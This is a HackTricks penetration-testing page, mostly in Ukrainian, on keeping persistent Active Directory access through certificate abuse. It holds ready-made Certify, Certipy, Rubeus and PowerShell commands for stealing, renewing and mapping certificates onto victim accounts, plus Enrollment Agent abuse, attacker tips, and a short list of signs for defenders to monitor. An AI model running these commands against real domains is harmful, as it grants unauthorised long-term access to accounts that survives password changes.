# AD CS Персистентність облікового запису

{{#include ../../../banners/hacktricks-training.md}}

**Це короткий підсумок розділів про персистентність облікових записів з відмінного дослідження [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Розуміння викрадення облікових даних користувача з використанням сертифікатів – PERSIST1

У сценарії, коли користувач може запросити сертифікат, що дозволяє аутентифікацію в домені, зловмисник має можливість запросити та викрасти цей сертифікат, щоб підтримувати персистентність у мережі. За замовчуванням шаблон `User` в Active Directory дозволяє такі запити, хоча іноді він може бути відключений.

Використовуючи [Certify](https://github.com/GhostPack/Certify) або [Certipy](https://github.com/ly4k/Certipy), ви можете шукати ввімкнені шаблони, що дозволяють аутентифікацію клієнта, а потім запросити один із них:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Сила сертифіката полягає в його здатності автентифікуватися як користувач, якому він належить, незалежно від змін пароля, доки сертифікат залишається дійсним.

Ви можете конвертувати PEM у PFX і використати його, щоб отримати TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Примітка: У поєднанні з іншими техніками (див. розділи THEFT), certificate-based auth дозволяє забезпечувати постійний доступ без взаємодії з LSASS і навіть із непідвищеними привілеями.

## Отримання постійного доступу на машині за допомогою сертифікатів - PERSIST2

Якщо зловмисник має підвищені привілеї на хості, він може отримати сертифікат для облікового запису машини скомпрометованої системи, використовуючи шаблон `Machine` за замовчуванням. Аутентифікація як машина дозволяє використовувати S4U2Self для локальних служб і може забезпечити тривалу персистентність на хості:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Розширення збереження доступу через оновлення сертифіката - PERSIST3

Зловживання періодами дійсності та поновлення шаблонів сертифікатів дозволяє зловмисникові підтримувати довгостроковий доступ. Якщо ви володієте раніше виданим сертифікатом і його приватним ключем, ви можете поновити його до закінчення строку дії, щоб отримати нові, довготривалі облікові дані без залишення додаткових артефактів запиту, пов'язаних із оригінальним обліковим записом.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Оперативна порада: відстежуйте терміни дії PFX-файлів, що знаходяться в розпорядженні атакуючого, і оновлюйте їх заздалегідь. Оновлення також може спричинити включення сучасного розширення SID mapping в оновлені сертифікати, зберігаючи їх придатність за суворіших правил відображення на DC (див. наступний розділ).

## Створення явних відображень сертифікатів (altSecurityIdentities) – PERSIST4

Якщо ви можете записувати в атрибут `altSecurityIdentities` цільового облікового запису, ви можете явно зіставити атакуючий сертифікат з цим обліковим записом. Це зберігається при зміні пароля і, при використанні сильних форматів відображення, залишається працездатним під сучасним застосуванням на DC.

High-level flow:

1. Отримайте або виділіть клієнтський сертифікат для аутентифікації, яким ви керуєте (наприклад, зареєструйте шаблон `User` на своє ім'я).
2. Витягніть сильний ідентифікатор із сертифіката (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Додайте явне відображення в атрибут `altSecurityIdentities` жертви, використовуючи цей ідентифікатор.
4. Аутентифікуйтеся за допомогою свого сертифіката; DC відобразить його на обліковий запис жертви через явне відображення.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Потім автентифікуйтеся за допомогою вашого PFX. Certipy безпосередньо отримає TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Побудова надійних відображень `altSecurityIdentities`

На практиці відображення **Issuer+Serial** і **SKI** є найпростішими надійними форматами для побудови з сертифіката, що перебуває в руках атакуючого. Це має значення після **February 11, 2025**, коли DCs за замовчуванням перейдуть на **Full Enforcement** і слабкі відображення перестануть бути надійними.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- Use strong mapping types only: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Weak formats (Subject/Issuer, Subject-only, RFC822 email) are deprecated and can be blocked by DC policy.
- The mapping works on both **user** and **computer** objects, so write access to a computer account's `altSecurityIdentities` is enough to persist as that machine.
- The cert chain must build to a root trusted by the DC. Enterprise CAs in NTAuth are typically trusted; some environments also trust public CAs.
- Schannel authentication remains useful for persistence even when PKINIT fails because the DC lacks the Smart Card Logon EKU or returns `KDC_ERR_PADATA_TYPE_NOSUPP`.

For more on weak explicit mappings and attack paths, see:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Відкликання сертифіката агента або дозволів шаблону необхідне для усунення цієї персистенції.

Оперативні нотатки
- Сучасні версії `Certipy` підтримують як `-on-behalf-of`, так і `-renew`, тож нападник, який має Enrollment Agent PFX, може емісувати і пізніше поновлювати кінцеві сертифікати без повторного доступу до початкового цільового облікового запису.
- Якщо отримати TGT через PKINIT неможливо, отриманий on-behalf-of сертифікат все одно можна використовувати для Schannel-аутентифікації за допомогою `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 ввів Strong Certificate Mapping Enforcement на контролерах домену. З 11 лютого 2025 року DC за замовчуванням переходять у Full Enforcement, відкидаючи слабкі/неоднозначні відповідності. Практичні наслідки:

- Сертифікати, випущені до 2022 року, які не містять розширення SID mapping, можуть не пройти неявне відображення, коли DC знаходяться у Full Enforcement. Нападники можуть зберегти доступ або поновивши сертифікати через AD CS (щоб отримати розширення SID), або встановивши сильне явне відображення в `altSecurityIdentities` (PERSIST4).
- Явні відображення зі сильними форматами (Issuer+Serial, SKI, SHA1-PublicKey) продовжують працювати. Слабкі формати (Issuer/Subject, Subject-only, RFC822) можуть бути заблоковані і їх слід уникати для персистенції.

Адміністратори мають моніторити та налаштувати оповіщення щодо:
- Змін у `altSecurityIdentities` та випусків/поновлень Enrollment Agent і User certificates.
- CA журналів випуску щодо on-behalf-of запитів та незвичних шаблонів поновлення.

## References

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
